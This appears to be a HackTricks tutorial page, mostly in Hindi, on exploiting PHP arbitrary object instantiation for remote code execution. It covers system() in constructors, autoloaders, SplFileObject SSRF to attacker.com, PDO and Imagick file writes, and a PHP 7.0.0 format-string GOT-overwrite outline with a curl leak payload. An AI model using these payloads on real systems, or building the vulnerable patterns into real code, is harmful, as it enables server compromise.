# PHP - RCE ऑब्जेक्ट निर्माण का दुरुपयोग: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

यह मूल रूप से [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) का सारांश है

## परिचय

नए मनमाने ऑब्जेक्ट्स का निर्माण, जैसे `new $_GET["a"]($_GET["a"])`, Remote Code Execution (RCE) का कारण बन सकता है, जैसा कि [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) में विस्तार से बताया गया है। यह दस्तावेज RCE प्राप्त करने की विभिन्न रणनीतियों को उजागर करता है।

## कस्टम क्लासेस या Autoloading के माध्यम से RCE

सिंटैक्स `new $a($b)` का उपयोग किसी ऑब्जेक्ट को instantiate करने के लिए किया जाता है जहाँ **`$a`** क्लास का नाम दर्शाता है और **`$b`** constructor को पास किया गया पहला argument है। ये वेरिएबल्स GET/POST जैसे user inputs से आ सकते हैं, जहाँ वे strings या arrays हो सकते हैं, या JSON से, जहाँ वे अन्य प्रकारों के रूप में प्रकट हो सकते हैं।

नीचे दिए गए कोड स्निपेट पर विचार करें:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
इस मामले में, `$a` को `App` या `App2` और `$b` को एक सिस्टम कमांड (जैसे, `uname -a`) सेट करने पर वह कमांड निष्पादित हो जाती है।

**Autoloading functions** का दुरुपयोग किया जा सकता है अगर ऐसी कोई क्लासेस सीधे उपलब्ध न हों। ये फ़ंक्शन आवश्यकतानुसार फ़ाइलों से क्लासेस को स्वचालित रूप से लोड करते हैं और इन्हें `spl_autoload_register` या `__autoload` का उपयोग करके परिभाषित किया जाता है:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
The behavior of autoloading varies with PHP versions, offering different RCE possibilities.

## Built-In Classes के माध्यम से RCE

कस्टम क्लासेस या autoloaders का अभाव होने पर, **built-in PHP classes** RCE के लिए पर्याप्त हो सकती हैं। इन क्लासेस की संख्या PHP संस्करण और एक्सटेंशन्स के आधार पर लगभग 100 से 200 के बीच होती है। इन्हें `get_declared_classes()` का उपयोग करके सूचीबद्ध किया जा सकता है।

दिलचस्प constructors को reflection API के माध्यम से पहचाना जा सकता है, जैसा कि निम्न उदाहरण और लिंक [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) में दिखाया गया है।

**विशेष तरीकों के माध्यम से RCE में शामिल हैं:**

### **SSRF + Phar Deserialization**

The `SplFileObject` class enables SSRF through its constructor, allowing connections to any URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF Phar protocol का उपयोग करके PHP के 8.0 से पहले के संस्करणों में deserialization attacks का कारण बन सकता है।

### **PDOs का शोषण**

PDO class constructor DSN strings के माध्यम से डेटाबेस से कनेक्शन की अनुमति देता है, जो संभावित रूप से file creation या अन्य interactions को सक्षम कर सकता है:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

libxml2 के संस्करण पर निर्भर करते हुए, PHP के संस्करण 5.3.22 और 5.4.12 तक `SoapClient` और `SimpleXMLElement` constructors के माध्यम से XXE हमलों के प्रति संवेदनशील थे।

## RCE via Imagick Extension

एक प्रोजेक्ट की निर्भरताओं के विश्लेषण में पता चला कि नए objects instantiate करके **Imagick** को **command execution** के लिए leverage किया जा सकता है। यह कमजोरियों के शोषण का एक मौका प्रस्तुत करता है।

### VID parser

VID parser की यह क्षमता कि वह filesystem में किसी भी निर्दिष्ट path पर content लिख सके, पहचानी गई। इससे किसी वेब-एक्सेसिबल directory में एक PHP shell रखने का मार्ग खुल सकता है, जिससे Remote Code Execution (RCE) प्राप्त हो सकता है।

#### VID Parser + File Upload

ध्यान दिया गया है कि PHP अपलोड की गई फाइलों को अस्थायी रूप से `/tmp/phpXXXXXX` में स्टोर करता है। Imagick में VID parser, **msl** protocol का उपयोग करते हुए, file paths में wildcards को संभाल सकता है, जिससे अस्थायी फ़ाइल को किसी चुनी हुई लोकेशन पर स्थानांतरित करना संभव होता है। यह तरीका filesystem में arbitrary file writing हासिल करने का एक अतिरिक्त तरीका प्रदान करता है।

### PHP Crash + Brute Force

एक तरीका जो [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) में वर्णित है, ऐसी फाइलें अपलोड करने पर आधारित है जो deletion से पहले सर्वर crash कर देती हैं। temporary file के नाम को brute-force करके, Imagick के लिए arbitrary PHP code execute करना संभव हो जाता है। हालांकि, यह तकनीक केवल ImageMagick के एक outdated version में ही प्रभावी पाई गई।

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

जब user input class name को नियंत्रित करता है (उदा., `new $_GET['model']()`), PHP 7.0.0 ने `Throwable` refactor के दौरान एक अस्थायी bug पेश किया जहाँ engine resolution के दौरान class name को गलती से printf format string के रूप में ट्रीट करता था। इससे PHP के अंदर classic printf-style primitives सक्षम होते हैं: leaks with `%p`, write-count control width specifiers के साथ, और arbitrary writes with `%n` in-process pointers (उदाहरण के लिए, GOT entries on ELF builds) के खिलाफ।

न्यूनतम repro vulnerable पैटर्न:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Exploitation outline (from the reference):
- क्लास नाम में `%p` के माध्यम से पते leak करके एक लिखने-योग्य लक्ष्य खोजें:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- पोजीशनल पैरामीटर्स और width specifiers का उपयोग करके एक सटीक बाइट-काउंट सेट करें, फिर `%n` का उपयोग कर उस मान को स्टैक पर पहुँच योग्य पते पर लिखें, GOT slot (e.g., `free`) को लक्ष्य करके आंशिक रूप से इसे `system` में overwrite करें।
- हाइजैक की गई फ़ंक्शन को ट्रिगर करने के लिए ऐसा क्लास नाम पास करें जिसमें एक shell pipe हो ताकि `system("id")` पहुँच सके।

Notes:
- केवल PHP 7.0.0 पर काम करता है (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); बाद के रिलीज़ में ठीक कर दिया गया। Severity: critical अगर arbitrary class instantiation मौजूद है।
- सामान्य payloads कई `%p` को chain करके स्टैक पर नेविगेट करते हैं, फिर `%.<width>d%<pos>$n` का उपयोग कर आंशिक overwrite कराते हैं।

## References

- https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
- https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/

{{#include ../../../banners/hacktricks-training.md}}
